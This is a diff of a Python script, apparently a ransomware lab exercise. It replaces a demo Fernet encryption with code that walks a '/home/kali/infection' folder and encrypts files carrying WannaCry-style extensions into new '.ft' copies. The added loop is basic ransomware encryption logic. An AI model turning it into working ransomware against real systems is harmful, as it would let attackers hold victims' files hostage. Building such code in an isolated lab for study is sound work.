@@ -2,6 +2,8 @@ from cryptography.fernet import Fernet
 import base64
 import hashlib
 import sys
+import os
+import re
 
 
 
@@ -62,11 +64,19 @@ if not reverse:
 
 
 
-	# Encrypter les données
-	donnees_a_chiffrer = "Ma mami fait des films pour adulte"
-	donnees_chiffrees = fernet.encrypt(donnees_a_chiffrer.encode())
-	# Afficher les données chiffrées
-	print("Données chiffrées :", donnees_chiffrees)
+
+	path = "/home/kali/infection"
+
+	for root, dirs, files in os.walk(path):
+		for file in files:
+			pattern = r".*\.(wncy|wnry|wncry|wncryt|wcry)$"
+			if re.match (pattern, file):
+				print("here",file)
+				with open (os.path.join(root,file), 'r') as fichier:
+					new_file_data = fichier.read()
+					new_file_data_cr=fernet.encrypt(new_file_data.encode())
+					new_file = open(os.path.join(root,file)+".ft","w")
+					new_file.write(new_file_data_cr.decode())
 
 
 if reverse:
